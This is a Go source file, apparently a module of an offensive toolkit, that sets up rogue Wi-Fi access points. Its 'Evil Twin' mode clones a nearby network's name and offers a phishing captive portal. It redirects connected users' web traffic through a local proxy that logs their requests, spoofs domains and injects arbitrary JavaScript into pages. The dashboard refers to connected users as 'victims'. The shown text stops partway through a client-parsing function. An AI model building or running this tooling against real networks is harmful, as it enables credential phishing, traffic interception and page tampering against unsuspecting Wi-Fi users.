package nethunter

import (
	"bufio"
	"context"
	"errors"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"os/exec"
	"os/signal"
	"path/filepath"
	"programa/utils"
	"runtime"
	"sort"
	"strings"
	"sync"
	"syscall"
	"time"
	"unicode"
)

type Client struct {
	MAC          string
	IP           string
	Hostname     string
	ConnectedAt  time.Time
	LastSeen     time.Time
	DNSQueries   []string
	HTTPRequests []string
	TrafficBytes int64
}

var (
	connectedClients   = make(map[string]*Client)
	clientsMutex       sync.Mutex
	rulesMutex         sync.RWMutex
	apRunning          = false
	apInterface        string
	internetInterface  = ""
	ifaceManagedByNM   = false
	dnsmasqLeasesPath  = ""
	blockedSites       = []string{}
	dnsSpoof           = make(map[string]string)
	injectedJS         = ""
	clientBlockedSites = make(map[string][]string)
	clientDNSSpoof     = make(map[string]map[string]string)
	clientInjectedJS   = make(map[string]string)
	provideInternet    = false
	proxyServer        *http.Server
	captiveServer      *http.Server
	processMu          sync.Mutex
	hostapdCmd         *exec.Cmd
	dnsmasqCmd         *exec.Cmd
	sessionLogDir      = "/tmp"
	natConfigured      = false
	redirectConfigured = false
)

func NetHunter() {
	if !checkRequirements() {
		fmt.Printf("%s[!] NetHunter requirements were not satisfied.%s\n", utils.Red, utils.Reset)
		utils.PauseForInput()
		return
	}

	for {
		utils.ClearTerminal()
		showNetHunterMenu()

		reader := bufio.NewReader(os.Stdin)
		fmt.Printf("%sChoose an option: %s", utils.Green, utils.Reset)
		input, _ := reader.ReadString('\n')
		input = strings.TrimSpace(input)

		switch input {
		case "1":
			createFakeLAN()
		case "2":
			launchEvilTwin()
		case "3":
			return
		default:
			fmt.Printf("%sInvalid option!%s\n", utils.Red, utils.Reset)
			utils.PauseForInput()
		}
	}
}

func showNetHunterMenu() {
	fmt.Printf("\n%s╔═══════════════════════════════════════════════════════════════╗%s\n", utils.Purple, utils.Reset)
	fmt.Printf("%s║                    NETHUNTER                                  ║%s\n", utils.Purple, utils.Reset)
	fmt.Printf("%s╚═══════════════════════════════════════════════════════════════╝%s\n\n", utils.Purple, utils.Reset)

	fmt.Printf("%s  [1] Create Fake LAN%s\n", utils.Green, utils.Reset)
	fmt.Printf("%s  [2] Launch Evil Twin%s\n", utils.Red, utils.Reset)
	utils.PrintReturnOption("3")
}

func checkRequirements() bool {
	isWin := runtime.GOOS == "windows"

	if isWin {
		tools := []string{"netsh"}
		for _, tool := range tools {
			if _, err := exec.LookPath(tool); err != nil {
				fmt.Printf("%s[!] Missing: %s%s\n", utils.Red, tool, utils.Reset)
				return false
			}
		}
	} else {
		if !ensureLinuxRootAccess() {
			return false
		}

		requiredTools := map[string]string{
			"hostapd":  "hostapd",
			"dnsmasq":  "dnsmasq",
			"iptables": "iptables",
			"ip":       "iproute2",
			"iw":       "iw",
			"nmcli":    "network-manager",
		}

		if !ensureLinuxTools(requiredTools) {
			return false
		}
	}
	return true
}

func ensureLinuxRootAccess() bool {
	if os.Geteuid() == 0 {
		return true
	}

	if _, err := exec.LookPath("sudo"); err != nil {
		fmt.Printf("%s[!] Root privileges are required and 'sudo' was not found.%s\n", utils.Red, utils.Reset)
		return false
	}

	reader := bufio.NewReader(os.Stdin)
	fmt.Printf("%s[*] Root privileges required. Relaunch with sudo now? (y/n): %s", utils.Yellow, utils.Reset)
	answer, _ := reader.ReadString('\n')
	answer = strings.ToLower(strings.TrimSpace(answer))
	if answer != "y" && answer != "yes" {
		fmt.Printf("%s[!] Cannot continue without root privileges%s\n", utils.Red, utils.Reset)
		return false
	}

	executablePath, err := os.Executable()
	if err != nil {
		fmt.Printf("%s[!] Failed to resolve executable path: %v%s\n", utils.Red, err, utils.Reset)
		return false
	}

	args := append([]string{"-E", executablePath}, os.Args[1:]...)
	cmd := exec.Command("sudo", args...)
	cmd.Stdin = os.Stdin
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	if err := cmd.Run(); err != nil {
		fmt.Printf("%s[!] Failed to relaunch with sudo: %v%s\n", utils.Red, err, utils.Reset)
		return false
	}

	os.Exit(0)
	return false
}

func ensureLinuxTools(requiredTools map[string]string) bool {
	var missingTools []string
	missingPackagesMap := make(map[string]bool)

	for tool, pkg := range requiredTools {
		if _, err := exec.LookPath(tool); err != nil {
			missingTools = append(missingTools, tool)
			missingPackagesMap[pkg] = true
		}
	}

	if len(missingTools) == 0 {
		return true
	}

	sort.Strings(missingTools)
	var missingPackages []string
	for pkg := range missingPackagesMap {
		missingPackages = append(missingPackages, pkg)
	}
	sort.Strings(missingPackages)

	fmt.Printf("%s[!] Missing tools: %s%s\n", utils.Yellow, strings.Join(missingTools, ", "), utils.Reset)

	if _, err := exec.LookPath("apt-get"); err != nil {
		fmt.Printf("%s[!] Automatic install currently supports apt-based systems only.%s\n", utils.Red, utils.Reset)
		fmt.Printf("%s[!] Please install manually: %s%s\n", utils.Yellow, strings.Join(missingPackages, " "), utils.Reset)
		return false
	}

	reader := bufio.NewReader(os.Stdin)
	fmt.Printf("%s[*] Install missing dependencies now? (y/n): %s", utils.Yellow, utils.Reset)
	answer, _ := reader.ReadString('\n')
	answer = strings.ToLower(strings.TrimSpace(answer))
	if answer != "y" && answer != "yes" {
		fmt.Printf("%s[!] Cannot continue without required dependencies%s\n", utils.Red, utils.Reset)
		return false
	}

	fmt.Printf("%s[*] Running apt-get update...%s\n", utils.Yellow, utils.Reset)
	if err := runInteractiveCommand("apt-get", "update"); err != nil {
		fmt.Printf("%s[!] apt-get update failed: %v%s\n", utils.Red, err, utils.Reset)
		return false
	}

	installArgs := append([]string{"install", "-y"}, missingPackages...)
	fmt.Printf("%s[*] Installing packages: %s%s\n", utils.Yellow, strings.Join(missingPackages, ", "), utils.Reset)
	if err := runInteractiveCommand("apt-get", installArgs...); err != nil {
		fmt.Printf("%s[!] Package installation failed: %v%s\n", utils.Red, err, utils.Reset)
		return false
	}

	for _, tool := range missingTools {
		if _, err := exec.LookPath(tool); err != nil {
			fmt.Printf("%s[!] Tool still missing after install: %s%s\n", utils.Red, tool, utils.Reset)
			return false
		}
	}

	return true
}

func runInteractiveCommand(name string, args ...string) error {
	cmd := exec.Command(name, args...)
	cmd.Stdin = os.Stdin
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	return cmd.Run()
}

func createFakeLAN() {
	utils.ClearTerminal()
	fmt.Printf("\n%s═══ CREATE FAKE LAN ═══%s\n\n", utils.Green, utils.Reset)

	reader := bufio.NewReader(os.Stdin)

	var ssid string
	for {
		fmt.Printf("%sNetwork Name (SSID 1-32 chars): %s", utils.Green, utils.Reset)
		input, _ := reader.ReadString('\n')
		input = strings.TrimSpace(input)

		valid, errMsg := validateSSID(input)
		if !valid {
			fmt.Printf("%s[!] Invalid SSID: %s%s\n", utils.Red, errMsg, utils.Reset)
			continue
		}
		ssid = input
		break
	}

	fmt.Printf("%sProvide real internet? (y/n): %s", utils.Yellow, utils.Reset)
	provideInternetInput, _ := reader.ReadString('\n')
	provideInternetInput = strings.ToLower(strings.TrimSpace(provideInternetInput))
	provideInternet = provideInternetInput == "y" || provideInternetInput == "yes"
	if provideInternet {
		fmt.Printf("%s[i] Requires host internet on a different interface than the AP (e.g. ethernet, USB tethering/mobile data, or a 2nd Wi-Fi adapter).%s\n", utils.Blue, utils.Reset)
	}

	fmt.Printf("%sRequire password? (y/n): %s", utils.Yellow, utils.Reset)
	requirePassword, _ := reader.ReadString('\n')
	requirePassword = strings.ToLower(strings.TrimSpace(requirePassword))

	var password string
	securityMode := "Open"
	if requirePassword == "y" || requirePassword == "yes" {
		fmt.Printf("%sPassword (WPA2 >=8, shorter falls back): %s", utils.Green, utils.Reset)
		password, _ = reader.ReadString('\n')
		password = strings.TrimSpace(password)
		if password == "" {
			fmt.Printf("%s[!] Password cannot be empty%s\n", utils.Red, utils.Reset)
			utils.PauseForInput()
			return
		}
		securityMode = detectSecurityMode(password)
		if securityMode == "WEP" {
			fmt.Printf("%s[!] Password < 8 chars, using WEP fallback (insecure)%s\n", utils.Yellow, utils.Reset)
		}
	}

	fmt.Printf("\n%s[*] Starting Fake LAN...%s\n", utils.Yellow, utils.Reset)
	fmt.Printf("%s[*] SSID: %s%s\n", utils.Yellow, ssid, utils.Reset)
	fmt.Printf("%s[*] Security: %s%s\n", utils.Yellow, securityMode, utils.Reset)

	iface := selectWirelessInterface()
	if iface == "" {
		fmt.Printf("%s[!] No wireless interface found%s\n", utils.Red, utils.Reset)
		utils.PauseForInput()
		return
	}

	apInterface = iface

	config := APConfig{
		SSID:            ssid,
		Interface:       iface,
		Password:        password,
		ProvideInternet: provideInternet,
	}

	if logDir, err := initializeSessionLogDir("lan", ssid); err != nil {
		fmt.Printf("%s[!] Failed to create log directory: %v%s\n", utils.Red, err, utils.Reset)
		fmt.Printf("%s[!] Falling back to /tmp logs%s\n", utils.Yellow, utils.Reset)
	} else {
		fmt.Printf("%s[*] Session logs: %s%s\n", utils.Yellow, logDir, utils.Reset)
	}

	if runtime.GOOS == "windows" {
		startFakeLANWindows(config)
	} else {
		startFakeLANLinux(config)
	}
	if !apRunning {
		fmt.Printf("%s[!] Failed to start Fake LAN '%s'%s\n", utils.Red, ssid, utils.Reset)
		utils.PauseForInput()
		return
	}

	fmt.Printf("\n%s[✓] Fake LAN '%s' is running!%s\n", utils.Green, ssid, utils.Reset)
	fmt.Printf("%s[*] Monitoring connections...%s\n\n", utils.Yellow, utils.Reset)

	go monitorClients(iface)

	if provideInternet {
		go startHTTPProxy()
	}

	displayDashboard(false)
}

func launchEvilTwin() {
	utils.ClearTerminal()
	fmt.Printf("\n%s═══ LAUNCH EVIL TWIN ═══%s\n\n", utils.Red, utils.Reset)

	fmt.Printf("%s[*] Scanning for nearby networks...%s\n", utils.Yellow, utils.Reset)

	networks := scanWiFiNetworks()

	if len(networks) == 0 {
		fmt.Printf("%s[!] No networks found%s\n", utils.Red, utils.Reset)
		utils.PauseForInput()
		return
	}

	fmt.Printf("\n%sAvailable Networks:%s\n\n", utils.Blue, utils.Reset)
	for i, net := range networks {
		security := "Open"
		if net.Encrypted {
			security = "Secured"
		}
		fmt.Printf("%s[%d] %s (Signal: %d%%) [%s]%s\n", utils.Green, i+1, net.SSID, net.Signal, security, utils.Reset)
	}

	reader := bufio.NewReader(os.Stdin)
	fmt.Printf("\n%sSelect network to clone: %s", utils.Green, utils.Reset)
	input, _ := reader.ReadString('\n')
	input = strings.TrimSpace(input)

	var choice int
	fmt.Sscanf(input, "%d", &choice)

	if choice < 1 || choice > len(networks) {
		fmt.Printf("%s[!] Invalid choice%s\n", utils.Red, utils.Reset)
		utils.PauseForInput()
		return
	}

	targetNetwork := networks[choice-1]

	fmt.Printf("\n%sEvil Twin Options:%s\n", utils.Yellow, utils.Reset)
	fmt.Printf("%s  [1] No password (open)%s\n", utils.Green, utils.Reset)
	fmt.Printf("%s  [2] Same password (if known)%s\n", utils.Green, utils.Reset)
	fmt.Printf("%s  [3] Captive portal (phishing)%s\n", utils.Red, utils.Reset)

	fmt.Printf("\n%sSelect option: %s", utils.Green, utils.Reset)
	optionInput, _ := reader.ReadString('\n')
	optionInput = strings.TrimSpace(optionInput)

	var mode string
	var password string

	switch optionInput {
	case "1":
		mode = "open"
	case "2":
		mode = "password"
		fmt.Printf("%sEnter password (WPA2 >=8, shorter falls back): %s", utils.Green, utils.Reset)
		password, _ = reader.ReadString('\n')
		password = strings.TrimSpace(password)
		if password == "" {
			fmt.Printf("%s[!] Password cannot be empty%s\n", utils.Red, utils.Reset)
			utils.PauseForInput()
			return
		}
		if detectSecurityMode(password) == "WEP" {
			fmt.Printf("%s[!] Password < 8 chars, using WEP fallback (insecure)%s\n", utils.Yellow, utils.Reset)
		}
	case "3":
		mode = "captive"
	default:
		fmt.Printf("%s[!] Invalid option%s\n", utils.Red, utils.Reset)
		utils.PauseForInput()
		return
	}

	fmt.Printf("\n%s[*] Launching Evil Twin: %s%s\n", utils.Yellow, targetNetwork.SSID, utils.Reset)

	iface := selectWirelessInterface()
	if iface == "" {
		fmt.Printf("%s[!] No wireless interface found%s\n", utils.Red, utils.Reset)
		utils.PauseForInput()
		return
	}

	apInterface = iface
	provideInternet = true
	fmt.Printf("%s[i] Internet sharing requires a host uplink different from AP interface (ethernet, USB tethering/mobile data, or a 2nd Wi-Fi adapter).%s\n", utils.Blue, utils.Reset)

	config := EvilTwinConfig{
		TargetSSID:      targetNetwork.SSID,
		Interface:       iface,
		Mode:            mode,
		Password:        password,
		ProvideInternet: true,
	}

	if logDir, err := initializeSessionLogDir("evil", targetNetwork.SSID); err != nil {
		fmt.Printf("%s[!] Failed to create log directory: %v%s\n", utils.Red, err, utils.Reset)
		fmt.Printf("%s[!] Falling back to /tmp logs%s\n", utils.Yellow, utils.Reset)
	} else {
		fmt.Printf("%s[*] Session logs: %s%s\n", utils.Yellow, logDir, utils.Reset)
	}

	if runtime.GOOS == "windows" {
		startEvilTwinWindows(config)
	} else {
		startEvilTwinLinux(config)
	}
	if !apRunning {
		fmt.Printf("%s[!] Failed to start Evil Twin '%s'%s\n", utils.Red, targetNetwork.SSID, utils.Reset)
		utils.PauseForInput()
		return
	}

	if mode == "captive" {
		go startCaptivePortal(targetNetwork.SSID)
	} else {
		go startHTTPProxy()
	}

	fmt.Printf("\n%s[✓] Evil Twin '%s' is active!%s\n", utils.Green, targetNetwork.SSID, utils.Reset)
	fmt.Printf("%s[*] Monitoring victims...%s\n\n", utils.Yellow, utils.Reset)

	go monitorClients(iface)

	displayDashboard(true)
}

type APConfig struct {
	SSID            string
	Interface       string
	Password        string
	ProvideInternet bool
}

type EvilTwinConfig struct {
	TargetSSID      string
	Interface       string
	Mode            string
	Password        string
	ProvideInternet bool
}

type WiFiNetwork struct {
	SSID      string
	Signal    int
	Encrypted bool
	BSSID     string
}

func selectWirelessInterface() string {
	if runtime.GOOS == "windows" {
		cmd := exec.Command("netsh", "wlan", "show", "interfaces")
		output, err := cmd.Output()
		if err != nil {
			return ""
		}

		lines := strings.Split(string(output), "\n")
		for _, line := range lines {
			if strings.Contains(line, "Name") {
				parts := strings.Split(line, ":")
				if len(parts) > 1 {
					return strings.TrimSpace(parts[1])
				}
			}
		}
	} else {
		wirelessIfaces := listWirelessInterfaces()
		if len(wirelessIfaces) == 0 {
			return ""
		}

		upstreamIface, _ := detectInternetInterface("")
		for _, iface := range wirelessIfaces {
			if iface != upstreamIface {
				return iface
			}
		}

		return wirelessIfaces[0]
	}
	return ""
}

func listWirelessInterfaces() []string {
	cmd := exec.Command("iw", "dev")
	output, err := cmd.Output()
	if err == nil {
		var interfaces []string
		lines := strings.Split(string(output), "\n")
		for _, line := range lines {
			line = strings.TrimSpace(line)
			if strings.HasPrefix(line, "Interface ") {
				parts := strings.Fields(line)
				if len(parts) > 1 {
					iface := parts[1]
					if strings.HasPrefix(iface, "p2p-dev") {
						continue
					}
					interfaces = append(interfaces, iface)
				}
			}
		}
		if len(interfaces) > 0 {
			return interfaces
		}
	}

	var fallback []string
	interfaces, _ := net.Interfaces()
	for _, iface := range interfaces {
		if strings.HasPrefix(iface.Name, "wlan") || strings.HasPrefix(iface.Name, "wlp") {
			if strings.HasPrefix(iface.Name, "p2p-dev") {
				continue
			}
			fallback = append(fallback, iface.Name)
		}
	}
	return fallback
}

func isWirelessInterface(iface string) bool {
	if iface == "" {
		return false
	}

	if strings.HasPrefix(iface, "wlan") || strings.HasPrefix(iface, "wlp") || strings.HasPrefix(iface, "wlx") {
		return true
	}

	wirelessPath := filepath.Join("/sys/class/net", iface, "wireless")
	if _, err := os.Stat(wirelessPath); err == nil {
		return true
	}

	return false
}

func scanWiFiNetworks() []WiFiNetwork {
	var networks []WiFiNetwork

	if runtime.GOOS == "windows" {
		cmd := exec.Command("netsh", "wlan", "show", "networks", "mode=bssid")
		output, _ := cmd.Output()

		lines := strings.Split(string(output), "\n")
		var currentSSID string
		var currentSignal int

		for _, line := range lines {
			line = strings.TrimSpace(line)

			if strings.HasPrefix(line, "SSID") && !strings.Contains(line, "BSSID") {
				parts := strings.Split(line, ":")
				if len(parts) > 1 {
					currentSSID = strings.TrimSpace(parts[1])
				}
			}

			if strings.Contains(line, "Signal") {
				parts := strings.Split(line, ":")
				if len(parts) > 1 {
					signal := strings.TrimSpace(parts[1])
					signal = strings.TrimSuffix(signal, "%")
					fmt.Sscanf(signal, "%d", &currentSignal)
				}
			}

			if strings.Contains(line, "Authentication") {
				encrypted := !strings.Contains(line, "Open")
				if currentSSID != "" {
					networks = append(networks, WiFiNetwork{
						SSID:      currentSSID,
						Signal:    currentSignal,
						Encrypted: encrypted,
					})
				}
			}
		}
	} else {
		cmd := exec.Command("nmcli", "-t", "-f", "SSID,SIGNAL,SECURITY", "dev", "wifi", "list")
		output, _ := cmd.Output()

		lines := strings.Split(string(output), "\n")
		for _, line := range lines {
			parts := strings.Split(line, ":")
			if len(parts) >= 3 {
				ssid := parts[0]
				signal := 0
				fmt.Sscanf(parts[1], "%d", &signal)
				encrypted := parts[2] != ""

				if ssid != "" {
					networks = append(networks, WiFiNetwork{
						SSID:      ssid,
						Signal:    signal,
						Encrypted: encrypted,
					})
				}
			}
		}
	}

	return networks
}

func startFakeLANWindows(config APConfig) {
	exec.Command("netsh", "wlan", "stop", "hostednetwork").Run()

	exec.Command("netsh", "wlan", "set", "hostednetwork", "mode=allow",
		fmt.Sprintf("ssid=%s", config.SSID), fmt.Sprintf("key=%s", config.Password)).Run()

	exec.Command("netsh", "wlan", "start", "hostednetwork").Run()

	if config.ProvideInternet {
		exec.Command("netsh", "interface", "portproxy", "add", "v4tov4",
			"listenport=80", "connectaddress=8.8.8.8", "connectport=80").Run()
	}

	apRunning = true
}

func buildHostapdConfigForAP(iface, ssid, password string) (string, string) {
	base := fmt.Sprintf("interface=%s\ndriver=nl80211\nssid=%s\nhw_mode=g\nchannel=6\nmacaddr_acl=0\nignore_broadcast_ssid=0\n", iface, ssid)
	securityMode := detectSecurityMode(password)

	if securityMode == "WPA2" {
		wpa := fmt.Sprintf("auth_algs=1\nwpa=2\nwpa_passphrase=%s\nwpa_key_mgmt=WPA-PSK\nrsn_pairwise=CCMP\n", password)
		return base + wpa, "WPA2"
	}

	if securityMode == "WEP" {
		wep := fmt.Sprintf("auth_algs=1\nwep_default_key=0\nwep_key0=\"%s\"\n", password)
		return base + wep, "WEP"
	}

	return base, "Open"
}

func detectSecurityMode(password string) string {
	if password == "" {
		return "Open"
	}

	if len(password) >= 8 {
		return "WPA2"
	}

	return "WEP"
}

func validateSSID(ssid string) (bool, string) {
	if len(ssid) == 0 {
		return false, "SSID cannot be empty"
	}

	if len(ssid) > 32 {
		return false, fmt.Sprintf("SSID too long: %d characters (max 32)", len(ssid))
	}

	validChars := true
	for _, r := range ssid {
		if r < 32 || r > 126 {
			validChars = false
			break
		}
	}

	if !validChars {
		return false, "SSID contains invalid characters (only ASCII 32-126 allowed)"
	}

	return true, ""
}

func startFakeLANLinux(config APConfig) {
	if supported, err := supportsAPMode(); err == nil && !supported {
		fmt.Printf("%s[!] Wireless adapter does not report AP mode support (iw list)%s\n", utils.Red, utils.Reset)
		return
	}

	prepareWirelessInterfaceForAP(config.Interface)
	apStarted := false
	defer func() {
		if !apStarted {
			restoreWirelessInterfaceManagement(config.Interface)
		}
	}()

	hostapdConf, secMode := buildHostapdConfigForAP(config.Interface, config.SSID, config.Password)

	if secMode == "WEP" {
		fmt.Printf("%s[!] Using WEP encryption - this is insecure%s\n", utils.Yellow, utils.Reset)
		fmt.Printf("%s[!] Upgrade password to 8+ characters for WPA2%s\n", utils.Yellow, utils.Reset)
	}

	hostapdConfPath, err := writeTempConfigFile("hostapd_", ".conf", hostapdConf)
	if err != nil {
		fmt.Printf("%s[!] Failed to write hostapd config: %v%s\n", utils.Red, err, utils.Reset)
		return
	}

	dnsmasqConf := `
interface=` + config.Interface + `
bind-interfaces
listen-address=10.0.0.1
dhcp-authoritative
dhcp-range=10.0.0.10,10.0.0.100,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
log-dhcp
address=/#/10.0.0.1
dhcp-option=114,http://10.0.0.1/
`

	dnsmasqLeasesPath = sessionLogPath("dnsmasq.leases")
	dnsmasqConf += "dhcp-leasefile=" + dnsmasqLeasesPath + "\n"

	dnsmasqConfPath, err := writeTempConfigFile("dnsmasq_", ".conf", dnsmasqConf)
	if err != nil {
		fmt.Printf("%s[!] Failed to write dnsmasq config: %v%s\n", utils.Red, err, utils.Reset)
		return
	}

	exec.Command("ip", "addr", "flush", "dev", config.Interface).Run()
	if err := exec.Command("ip", "addr", "add", "10.0.0.1/24", "dev", config.Interface).Run(); err != nil {
		fmt.Printf("%s[!] Failed to assign IP to %s: %v%s\n", utils.Red, config.Interface, err, utils.Reset)
		return
	}
	if err := exec.Command("ip", "link", "set", config.Interface, "up").Run(); err != nil {
		fmt.Printf("%s[!] Failed to bring interface up (%s): %v%s\n", utils.Red, config.Interface, err, utils.Reset)
		return
	}

	hostapdLogPath := sessionLogPath("hostapd.log")
	dnsmasqLogPath := sessionLogPath("dnsmasq.log")

	hostapdCmd, err = startManagedProcess("hostapd", []string{hostapdConfPath}, hostapdLogPath)
	if err != nil {
		fmt.Printf("%s[!] hostapd failed to start: %v%s\n", utils.Red, err, utils.Reset)
		fmt.Printf("%s[!] Check %s for details%s\n", utils.Yellow, hostapdLogPath, utils.Reset)
		return
	}
	dnsmasqCmd, err = startManagedProcess("dnsmasq", []string{"-C", dnsmasqConfPath, "-d"}, dnsmasqLogPath)
	if err != nil {
		fmt.Printf("%s[!] dnsmasq failed to start: %v%s\n", utils.Red, err, utils.Reset)
		fmt.Printf("%s[!] Check %s for details%s\n", utils.Yellow, dnsmasqLogPath, utils.Reset)
		stopManagedProcess(&hostapdCmd)
		return
	}
	fmt.Printf("%s[*] hostapd log: %s%s\n", utils.Yellow, hostapdLogPath, utils.Reset)
	fmt.Printf("%s[*] dnsmasq log: %s%s\n", utils.Yellow, dnsmasqLogPath, utils.Reset)

	if err := waitForHostapdReady(hostapdCmd, hostapdLogPath, 10*time.Second); err != nil {
		fmt.Printf("%s[!] AP did not become active: %v%s\n", utils.Red, err, utils.Reset)
		if config.Password != "" && strings.Contains(strings.ToLower(err.Error()), "key not allowed") {
			fmt.Printf("%s[!] This adapter/driver likely cannot run WPA AP mode with password. Try open network or a USB adapter that supports AP+WPA.%s\n", utils.Yellow, utils.Reset)
		}
		fmt.Printf("%s[!] Check %s%s\n", utils.Yellow, hostapdLogPath, utils.Reset)
		stopManagedProcess(&dnsmasqCmd)
		stopManagedProcess(&hostapdCmd)
		return
	}

	if config.ProvideInternet {
		if err := configureInternetSharing(config.Interface); err != nil {
			fmt.Printf("%s[!] Internet sharing not enabled: %v%s\n", utils.Red, err, utils.Reset)
			fmt.Printf("%s[!] AP will run without internet forwarding%s\n", utils.Yellow, utils.Reset)
		}
	}

	apStarted = true
	apRunning = true
}

func startEvilTwinWindows(config EvilTwinConfig) {
	startFakeLANWindows(APConfig{
		SSID:            config.TargetSSID,
		Interface:       config.Interface,
		Password:        config.Password,
		ProvideInternet: config.ProvideInternet,
	})
}

func startEvilTwinLinux(config EvilTwinConfig) {
	startFakeLANLinux(APConfig{
		SSID:            config.TargetSSID,
		Interface:       config.Interface,
		Password:        config.Password,
		ProvideInternet: config.ProvideInternet,
	})

	if !apRunning {
		return
	}

	if err := ensureIptablesRule([]string{"-t", "nat", "PREROUTING", "-i", config.Interface, "-p", "tcp", "--dport", "80", "-j", "REDIRECT", "--to-port", "8888"}); err != nil {
		fmt.Printf("%s[!] Failed to set HTTP redirect rule: %v%s\n", utils.Red, err, utils.Reset)
	} else {
		redirectConfigured = true
	}

	if config.Mode != "captive" {
		if err := ensureIptablesRule([]string{"-t", "nat", "PREROUTING", "-i", config.Interface, "-p", "tcp", "--dport", "443", "-j", "REDIRECT", "--to-port", "8888"}); err != nil {
			fmt.Printf("%s[!] Failed to set HTTPS redirect rule: %v%s\n", utils.Red, err, utils.Reset)
		} else {
			redirectConfigured = true
		}
	}
}

func startHTTPProxy() {
	processMu.Lock()
	if proxyServer != nil {
		processMu.Unlock()
		return
	}

	mux := http.NewServeMux()
	mux.HandleFunc("/", handleProxyRequest)

	srv := &http.Server{
		Addr:    ":8888",
		Handler: mux,
	}
	proxyServer = srv
	processMu.Unlock()

	if err := srv.ListenAndServe(); err != nil && !errors.Is(err, http.ErrServerClosed) {
		fmt.Printf("%s[!] HTTP proxy stopped: %v%s\n", utils.Red, err, utils.Reset)
	}

	processMu.Lock()
	if proxyServer == srv {
		proxyServer = nil
	}
	processMu.Unlock()
}

func handleProxyRequest(w http.ResponseWriter, r *http.Request) {
	clientIP := strings.Split(r.RemoteAddr, ":")[0]
	clientMAC := getClientMACByIP(clientIP)

	logHTTPRequest(clientIP, r)

	host := r.Host
	if host == "" {
		host = r.URL.Host
	}

	if isBlocked(host, clientMAC) {
		w.WriteHeader(http.StatusForbidden)
		w.Write([]byte("<html><body><h1>Site Blocked</h1><p>This website has been blocked by the network administrator.</p></body></html>"))
		return
	}

	spoofedIP := checkDNSSpoof(host, clientMAC)
	if spoofedIP != "" {
		http.Redirect(w, r, "http://"+spoofedIP, http.StatusFound)
		return
	}

	if r.URL.Scheme == "" {
		r.URL.Scheme = "http"
	}
	if r.URL.Host == "" {
		r.URL.Host = host
	}

	proxyReq, err := http.NewRequest(r.Method, r.URL.String(), r.Body)
	if err != nil {
		http.Error(w, "Proxy Error", http.StatusInternalServerError)
		return
	}

	for key, values := range r.Header {
		for _, value := range values {
			proxyReq.Header.Add(key, value)
		}
	}

	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Do(proxyReq)
	if err != nil {
		http.Error(w, "Cannot reach destination", http.StatusBadGateway)
		return
	}
	defer resp.Body.Close()

	for key, values := range resp.Header {
		for _, value := range values {
			w.Header().Add(key, value)
		}
	}

	body, _ := io.ReadAll(resp.Body)

	injectionJS := getInjectionJS(clientMAC)
	if injectionJS != "" && strings.Contains(resp.Header.Get("Content-Type"), "text/html") {
		bodyStr := string(body)
		if strings.Contains(bodyStr, "</body>") {
			injection := fmt.Sprintf("<script>%s</script></body>", injectionJS)
			bodyStr = strings.Replace(bodyStr, "</body>", injection, 1)
			body = []byte(bodyStr)
		}
	}

	w.WriteHeader(resp.StatusCode)
	w.Write(body)
}

func logHTTPRequest(clientIP string, r *http.Request) {
	clientsMutex.Lock()
	defer clientsMutex.Unlock()

	for _, client := range connectedClients {
		if client.IP == clientIP {
			url := fmt.Sprintf("%s %s%s", r.Method, r.Host, r.URL.Path)
			client.HTTPRequests = append(client.HTTPRequests, url)

			if r.Host != "" && !contains(client.DNSQueries, r.Host) {
				client.DNSQueries = append(client.DNSQueries, r.Host)
			}
			break
		}
	}
}

func getClientMACByIP(clientIP string) string {
	clientsMutex.Lock()
	defer clientsMutex.Unlock()

	for mac, client := range connectedClients {
		if client.IP == clientIP {
			return strings.ToLower(mac)
		}
	}

	return ""
}

func isBlocked(host, clientMAC string) bool {
	rulesMutex.RLock()
	defer rulesMutex.RUnlock()

	for _, blocked := range blockedSites {
		if strings.Contains(host, blocked) {
			return true
		}
	}

	if clientMAC != "" {
		for _, blocked := range clientBlockedSites[strings.ToLower(clientMAC)] {
			if strings.Contains(host, blocked) {
				return true
			}
		}
	}

	return false
}

func checkDNSSpoof(host, clientMAC string) string {
	rulesMutex.RLock()
	defer rulesMutex.RUnlock()

	if clientMAC != "" {
		if perClientRules, exists := clientDNSSpoof[strings.ToLower(clientMAC)]; exists {
			for domain, spoofIP := range perClientRules {
				if strings.Contains(host, domain) {
					return spoofIP
				}
			}
		}
	}

	for domain, spoofIP := range dnsSpoof {
		if strings.Contains(host, domain) {
			return spoofIP
		}
	}
	return ""
}

func getInjectionJS(clientMAC string) string {
	rulesMutex.RLock()
	defer rulesMutex.RUnlock()

	if clientMAC != "" {
		if js, exists := clientInjectedJS[strings.ToLower(clientMAC)]; exists && js != "" {
			return js
		}
	}

	return injectedJS
}

func monitorClients(iface string) {
	for apRunning {
		if runtime.GOOS == "windows" {
			cmd := exec.Command("netsh", "wlan", "show", "hostednetwork")
			output, _ := cmd.Output()
			parseWindowsClients(string(output))
		} else {
			parseLinuxClients(iface)
		}
		time.Sleep(5 * time.Second)
	}
}

func parseWindowsClients(output string) {
	clientsMutex.Lock()
	defer clientsMutex.Unlock()

	now := time.Now()
	lines := strings.Split(output, "\n")
	for _, line := range lines {
		if strings.Contains(line, "MAC address") {
			parts := strings.Split(line, ":")
			if len(parts) > 1 {
				mac := strings.TrimSpace(strings.Join(parts[1:], ":"))
				if _, exists := connectedClients[mac]; !exists {
					connectedClients[mac] = &Client{
						MAC:          mac,
						ConnectedAt:  time.Now(),
						LastSeen:     now,
						DNSQueries:   []string{},
						HTTPRequests: []string{},
					}
				} else {
					connectedClients[mac].LastSeen = now
				}
			}
		}
	}
}

func parseLinuxClients(iface string) {
	clientsMutex.Lock()
	defer clientsMutex.Unlock()

	localMAC := ""
	if netIface, err := net.InterfaceByName(iface); err == nil {
		localMAC = strings.ToLower(netIface.HardwareAddr.String())
	}

	localIPs := map[string]bool{
		"10.0.0.1": true,
	}
	if netIface, err := net.InterfaceByName(iface); err == nil {
		if addrs, err := netIface.Addrs(); err == nil {
			for _, addr := range addrs {
				ipPart := addr.String()
				if strings.Contains(ipPart, "/") {
					ipPart = strings.Split(ipPart, "/")[0]
				}
				if ipPart != "" {
					localIPs[ipPart] = true
				}
			}
		}
	}

	activeStations, stationDumpOK := parseAssociatedStationsLocked(iface)
	parseDnsmasqLeasesLocked(localMAC, localIPs)

	cmd := exec.Command("ip", "neigh", "show", "dev", iface)
	output, _ := cmd.Output()

